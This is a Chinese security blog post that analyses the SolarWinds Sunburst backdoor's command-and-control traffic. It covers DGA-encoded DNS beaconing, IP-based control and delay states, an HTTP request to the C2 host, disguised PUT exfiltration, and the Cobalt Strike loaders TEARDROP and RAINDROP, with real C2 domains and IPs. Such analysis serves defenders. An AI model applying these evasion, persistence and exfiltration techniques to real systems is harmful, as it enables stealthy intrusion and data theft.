<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/556lRLgoELxr7I37ubjJdg)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png)

 **Part1 前言** 
--------------

******由于先前文章存在部分错误，原文 ABC_123 已删除，上周末把文章修正，重新发布**。****

**大家好，我是 ABC_123**。前面几周分享了 Solarwinds 供应链攻击事件的详细攻击流程及 Sunburst 后门的设计思路，但是多数朋友还是对 Sunburst 后门的通信过程还是没看明白。本期 ABC_123 就从流量的角度，把 Sunburst 后门的通信过程完整地复盘一下，这样可以更直观地展示 Sunburst 后门是如何绕过流量监控的，从中我也学到了很多东西。

**注：**国外很多分析文章对于 Sunburst 后门的通信过程说法不一，很多细节描述存在很多矛盾的地方。ABC_123 按照自己的理解，综合各个安全公司的文章进行了复盘，其中难免有疏漏之处，敬请修正。

**注：**Sunburst 后门通信逃过了美国耗时十多年、花费数百亿美元建造的网络攻击防御系统 “爱因斯坦”（Einstein）。

**建议大家把公众号 “希潭实验室” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450DbhnGmO67ewLDJqstfHZSHdFeDURNa0QpfjclGrvg0lfANPtuLbf5Ddur3HZmdfAydibIf9zazCKQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **Part2 后门通信的前置知识** 
---------------------

*   ### **C2 控制 Sunburst 后门的方式**
    

上一篇文章 ABC_123 详细介绍过，本期再简单回顾一下。C2 服务端的攻击者会通过控制 C2 域名解析到不同的 ip 地址段，间接控制 Sunburst 后门的行为，接下来看一个简单的例子，看看攻击者如何控制 Sunburst 后门，使其永久退出。

首先，Sunburst 后门发起了 **ea99hr2sfen95nkjlc5g.appsync-api.eu-west-1.avsvmcloud.com** 的 dga 域名请求，C2 服务端的攻击者打算让这个后门永久停止退出，于是将这个 dga 域名解析到 ip 地址 **96.31.172.116**，Sunburst 获取到这个 ip 之后，查询如下列表，然后立即转为”**Truncate**” 状态，清除各种痕迹后，永久终止执行。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUVdEfVibpR6soBNcTjNibxHsIZicrxult2LjnhJE8icMsxzZm13YPMe4wpw/640?wx_fmt=png)

*   ### **C2 控制 Sunburst 后门的图解**
    

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUP8B76g6MTNZc4dtnQj6kOib0J4JXoZDB8vh0HhAIibhoLHICbWtiap9Zw/640?wx_fmt=png)

**蓝色部分 CONTINUE 的 IP 地址****。**当 C2 服务端攻击者将 dga 域名解析成图中蓝色部分的 IP 地址时，说明 C2 服务端的攻击者还未决定目标是否是有价值的目标，是否要进一步渗透，所以需要 Sunburst 后门会继续发起 dga 域名请求，以便接收攻击者发送下一步指令。

**红色部分的 STOP 的 IP 地址****。**如果随后攻击者发现目标计算机价值不大，或者目标机器安装的防护软件太强，需要放弃对此目标的渗透。C2 服务端攻击者就会将 dga 域名解析为红色部分的 ip 地址，这样 Sunburst 得到这部分的 ip 之后，会清理痕迹，然后永久停止运行。

**紫色的 TARGET 部分的 IP 地址****。**如果攻击者觉得受害目标值得进一步渗透，就将 dga 域名解析为上图紫色部分的 ip，然后返回一个 cname 域名，Sunburst 会接收这个域名（如图中的 deftsecurity.com），用作第 2 阶段的 HTTP C2 阶段的域名，开始正式接收 C2 的指令和回传指令执行结果。

*   ### **延迟定时器**
    

C2 的域名服务器不仅仅通过将 dga 域名解析到不同的 ip 地址来控制 Sunburst 后门的行为，**还通过控制解析 IP 地址的最后 8 位字节来控制 Sunburst 后门的下一次执行命令的等待时间**。例如，C2 服务端将 dga 域名解析为 96.31.172.116 的 ip 地址时，Sunburst 后门会将 IP 地址的最后一个八位数与掩码 0x54 进行与运算得到一个 “与结果”，然后参考下表中选择一个延时时间，在该间隔内 Sunburst 随机选择一个延时时间。

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450BeMYQImIWbYjfCmFeGMmLU4xiahEoLZUytCsH7WpKibWib6zjfjvsGpDV7aQibBicEchuHcy4aTBSL32A/640?wx_fmt=jpeg)

*   **C2 控制后门终止运行案例**
    

首先放出一张国外视频中给出的一个截图，讲述了 C2 控制 Sunburst 后门终止运行的全过程。

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUVwic1EHWlxIGOIslMQmYCnfEpEKB243GczqhPLaagb1N8Vp9ibCElSlw/640?wx_fmt=jpeg)

 **第 1 步**  Sunburst 后门请求一个域名如下：**lf9prvp9o36mhihw2hrs260g12eu1.appsync-api.eu-west-1.avsvmcloud.com**，对于这个域名的 **lf9prvp9o36mhihw2hrs260g12eu1** 部分使用工具解密，发现得到目标机器所在的域名 **omeros.local**。接着攻击者将域名解析到 **8.18.145.139** 这个 ip 地址，Sunburst 通过 ip 地址的最后 8 字节运算，得知需要延迟一分钟之后，将安全防护软件状态信息发送给 C2 服务端。

 **第 2 步**  延迟一分钟之后，Sunburst 后门发起第 2 个请求，通过 dga 域名的加密部分告诉 C2 服务端，目标机器有 **Carbon Black** 终端安全防护软件存在。C2 服务端将 dga 域名解析为 **8.18.145.62**，Sunburst 后门解析 ip 地址的最后 8 字节，得知需要延迟 1 天之后再次发起 dga 域名请求。

 **第 3 步**  延迟 1 天之后，Sunburst 通过 ping 如下 dga 域名，向 C2 请求指令，C2 将域名解析为 8.18.144.150，Sunburst 需要继续等待 1 天，然后发起 dga 域名请求。

 **第 4 步**  延迟 1 天之后，Sunburst 通过 ping 一个 dga 域名，C2 将域名解析为 8.18.145.151，Sunburst 继续等待。

 **第 5 步**  延迟 1 天之后，Sunburst 通过 ping 一个 dga 域名，C2 将域名解析为 20.140.84.127，Sunburst 得到了这个 ip，立刻明白 C2 让其立刻终止运行，**说明 C2 的所有者经过思索，认为此域名计算机进一步渗透的价值不大**，故放弃。

通过这个案例发现，Sunburst 后门在规避流量检测方面下足了功夫，**首先它在 4 天的时间内，仅仅发起了 5 个 dga 域名的 DNS 请求**，而且域名 appsync-api.eu-west-1.avsvmcloud.com 很容易让人联想到 AWS 的域名，导致后期安全人员进行溯源的时候，被认为是正常域名请求。从来没有一个后门有如此的耐心，延迟时间如此之长。

###  **Part3 完整的后门通信案例** 

接下来看一个 Sunburst 后门的完整通信案例，包括了 Sunburst 后门通过 dga 域名传输受害者计算机名、安全防护软件状态以及 c2 向 Sunburst 后门发送 HTTP C2 通信阶段的 CNAME 域名过程，这是第 1 阶段；然后再到第 2 阶段，Sunburst 后门发起 GET 请求. xml 文件获取 C2 下发的指令，后续将指令结果通过 PUT 请求以 JSON 文档格式回传给 C2 端；最后到第 3 阶段，投放加载器加载执行 CobaltStrike 后门的阶段。

###  **1   dga 域名传输阶段**

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUGkzNkEM9MxMaVayQTDfL1d278WwzXUNWdamSrBxic0HLTNiayYXppH9Q/640?wx_fmt=jpeg)

 ****第 1 步**** **2020-06-11 04:00 UTC**

Sunburst 发起查询：r8stkst71ebqgj66ervisu10bdohu0gt.appsync-api.us-west-2.avsvmcloud.com ⇒ AD 域，C2 攻击者得到第 1 部分内容 “central.pima.g”

响应：8.18.144.1 ⇒ Sunburst 后门休眠 1 小时，然后继续。

 ******第 2 步**** 2020-06-11 05:00 UTC**

Sunburst 发起查询：ulfmcf44qd58t9e82w.appsync-api.us-west-2.avsvmcloud.com ⇒ AD 域，C2 攻击者得到第 2 部分 “ov”

响应：8.18.144.2 ⇒ Sunburst 后门休眠 1 小时，然后继续（**此时攻击者知道了目标计算机的完整域名是 central.pima.gov**）。

 ******第 3 步**** 2020-06-11 06:00 UTC**

Sunburst 发起查询：p50jllhvhmoti8mpbf6p2di.appsync-api.us-west-2.avsvmcloud.com ⇒ 无可报告。

响应：8.18.144.16 ⇒ Sunburst 后门休眠 8 小时，然后继续（**此时攻击者知道，目标的防护软件都处于关闭状态**）。

 ******第 4 步**** 2020-06-11 14:00 UTC**

Sunburst 发起查询：(?) ⇒ 没有新的报告

响应：8.18.144.17 ⇒ Sunburst 后门休眠 8 小时，然后继续（**此时攻击者在评估该目标是否有价值，是否值得进一步渗透**）

 ******第 5 步**** 2020-06-11 22:35 UTC**

Sunburst 发起查询：j5uqlssr1hfqnn8hkf172mp.appsync-api.us-west-2.avsvmcloud.com ⇒ 无需报告

响应：184.72.181.52 ⇒Sunburst 休眠 1-3 分钟（**解析到该 IP 地址，Sunburst 将会准备进入第 2 阶段 HTTP C2 阶段**）

 ******第 6 步**** 2020-06-11 22:37 UTC**

Sunburst 发起查询：7sbvaemscs0mc925tb99.appsync-api.us-west-2.avsvmcloud.com ⇒ Sunburst 后门请求 CNAME

响应：deftsecurity.com ⇒第 2 阶段 HTTPS C2 服务器的 CNAME（**此时 Sunburst 通过 dga 域名解析，发现 CNAME 值不为空，于是获取该 CNAME 值，将其作为进入第二阶段 HTTP C2 通信阶段的域名**）

###  **2   发起 HTTP 请求向 C2 请求指令**

Sunburst 后门随后进入 HTTP C2 通信阶阶段，Sunburst 向 C2 的 CNAME 值 deftsecurity.com 发起如下 HTTP 请求，请求一个 xml 文件：

**GET /swip/upd/Orion.UI-5.2.0.xml HTTP/1.1**

**If-None-Match: bfc145s6149c4290ef3b2c1732449c562a24g66d**

**Host: deftsecurity.com**

**Connection: Close**

如下图所示，服务端返回一个看起来像是一个正常的 xml 程序集的文件，其实攻击者的控制指令就被加密隐写在这些 XML 文件的一些字段的值中。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUkzb2rax7fw243Ad58nh4INqfghu8mXHIsiclHEgH36OEbqdnaeMRwAg/640?wx_fmt=png)

Sunburst 通过解析上述 xml 文件中的加密部分，得到指令 ID 和指令的附加参数。参考如下表格，如果指令对应的 ID 是 Exit，就是终止当前线程，如果是 SetTime，就结合解密出来的附加参数设置延迟时间。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUxcfLp47KRoSUwYXjiaDDj1Mgria2jaraPOkxWZrPgc80KF6DR1H0FmPQ/640?wx_fmt=png)

###  **3   向 C2 回传命令执行结果**

在从 xml 文件中解密获取到攻击者发送的指令之后，Sunburst 会执行指令，然后将返回结果回传给服务端。上篇文章 ABC_123 重点介绍过，对于返回结果小于 10,000 的情况，会向一个结尾为. woff2 的 url 以 PUT 请求发送一个 json 格式数据，Sunburst 把执行结果加密隐藏在 json 文档中。  

url 生成规则如下（详情请见上一篇文章）

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450CBBQ7uAg6tjpCmSCllZrDg5w2zF7gLHleZIXz7ZLbwKSsHRwU4o5SmMmvicKibHCwYUXk73MXBjsfQ/640?wx_fmt=jpeg)

Sunburst 回传数据的请求数据包大致如下（这是 ABC_123 根据国外分析文章拼起来的，可能会缺少部分的 header 头信息）

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450DrH2ibKgvuRACKhkJjCqoLgIX4fopxJsqXKegysqrH3V5DtqWFKUqCY99W1XH8tOzEZYe1Pa7bYIA/640?wx_fmt=jpeg)

请求数据包的解释如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CBBQ7uAg6tjpCmSCllZrDgvsF48ONZicSVzP80jiaGibQKXXXYNfE0R9PK56Kdy152oXOHoiaNSdibMag/640?wx_fmt=png)

接下来 Sunburst 后门会不断向 c2 域名请求 xml 文件，获取需要执行的指令，然后将执行结果通过 PUT 请求以 json 文档的形式回传给 c2 服务端，之后进入第三阶段使用 CobaltStrike 后门进行内网横向阶段。

###  **4   CobaltStrike 后门通信**

接下俩进入第三阶段，Sunburst 会下载一个 vbs 脚本及 Loader 加载器程序，然后放在 C:\Windows 目录下，伪装成合法文件。接着 Sunburst 使用映像劫持技术，修改注册表，将 dllhost.exe 与 wscript.exe C:\Windows\[folder]\[trigger].vbs 命令绑定，至此 Sunburst 后门已经完成了它的使命，系统静静等待 dllhost.exe 执行，进一步执行 vbs 脚本。bbs 脚本会运行 rundll32.exe 加载前一步的恶意 dll 文件，随后清理 dllhost.exe 的映像劫持注册表，清理痕迹。

*   **投放 TEARDROP 工具**
    

TearDrop 总共发现两个变种：

**第 1 个变种是 libintl3.dll**，该样本通过 rundll32.exe 加载，然后从当前目录读取名为 upbeat_anxiety.jpg 的图片文件，并确保它具有 jpg 标头，并从中提取 shellcode，该 CobaltStrike 后门通过连接到 infinitysoftwares[.]com 进行命令和控制。

**第 2 个变种是 NETSETUPSVC.dll**，使用了添加服务的方式启动，过 svchost.exe 加载并调用导出函数 NetSetupServiceMain，NETSETUPSVC.dll 文件复用了 libintl3.dll 文件的代码。从当前目录读取 festive_computer.jpg 图片文件，该 CobaltStrike 后门通过连接到 ervsystem[.]com 进行命令和控制。

TEARDROP 使用 “twitter.com” 作为 https 协议中的 Referer 字段的内容，会使安全人员误以为 C2 域名 infinitysoftwares[.]com 是一个正常的白名单域名，从而逃避检测。

**TearDrop 的 CobaltStrike 通信阶段的流量数据如下：**

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUdnE0VShpErhjQtho2icyUWPKLicBpOWyiaIEIiaqbjPzuElibPAa1s4wcwg/640?wx_fmt=jpeg)

*   **投放 RAINDROP 工具**
    

以 bproxy.dll 形式存在，之后安装了一个 7z.dll 的文件之后将域渗透工具 DSInternals 提取到受害者机器上。对于 7z.dll 文件，该文件的制作依赖于 7-zip 开源代码为载体，攻击代码隐写在代码段中。该后门同样会以 CobaltStrike 方式，通过与 bigtopweb.com 通信实现内网横向控制，Referer 伪装成 bing.com 迷惑安全人员，误以为 bigtopweb.com 是一个正常的白名单域名。

在这个阶段，有的 CS 实例基于 HTTP 的命令和控制服务器，有的是用 SMB 的网络通道 \\.\pipe\protected_storage 进行内网通信。（完整的数据包没有找到，大家从下面的日志中一窥全貌吧）

**RainDrop 的 CobaltStrike 通信阶段的流量数据如下：**

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450BeMYQImIWbYjfCmFeGMmLUqWE3aNHBbpCsRLmjuKcc9KuGoc7lrjHOg9bBI9jl2WicPunD2LvUleg/640?wx_fmt=jpeg)

 **Part4 总结** 
--------------

**1.**  Sunburst 后门激活后门随机等待 12 到 14 天然后正式激活执行，部分单位的安全设备日志留存 12 天左右，然后就会被新的日志覆盖掉。

**2.** C2 的通信在初始阶段获取内网计算机域名和安全防护软件基本信息过程中，流量都隐藏在 dga 域名中，难以发现。而且在 3、4 天的时间，Sunburst 后门仅仅发起 4、5 次 dga 域名请求，如此低频率的访问更加难以发现。

**3.** 价值不高的目标会被立刻终止掉，防止被检测设备发现。

**4.** 攻击者最终只选择了大约 1% 的有价值的目标进行内网横向渗透，并将安全防护很高的目标放弃掉，这种取舍，降低了被发现的概率。

**5.** dga 域名解析的 ip 地址段，选用的是微软、谷歌、亚马逊的地址段，很容易直接就被检测软件加入白名单，整个通信流量看起来都是正常流量，难以甄别。

**6.** Sunburst 后门所使用的的 dga 域名 appsync-api.us-west-2.avsvmcloud.com 很好地迷惑了安全人员的溯源，使其误以为是 AWS 旗下域名。

**7.**  综上所述，大家可以看到 Sunburst 设计的精妙之处，流量层面做得如此隐蔽，不得不让人惊叹，**后续 ABC_123 会继续分享火眼 FireEye 公司是如何对此次攻击事件进行溯源的，敬请期待**。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

**公众号专注于网络安全技术分享，包括 APT 事件分析、红队攻防、蓝队分析、渗透测试、代码审计等，每周一篇，99% 原创，敬请关注。**

**Contact me: 0day123abc#gmail.com(replace # with @)**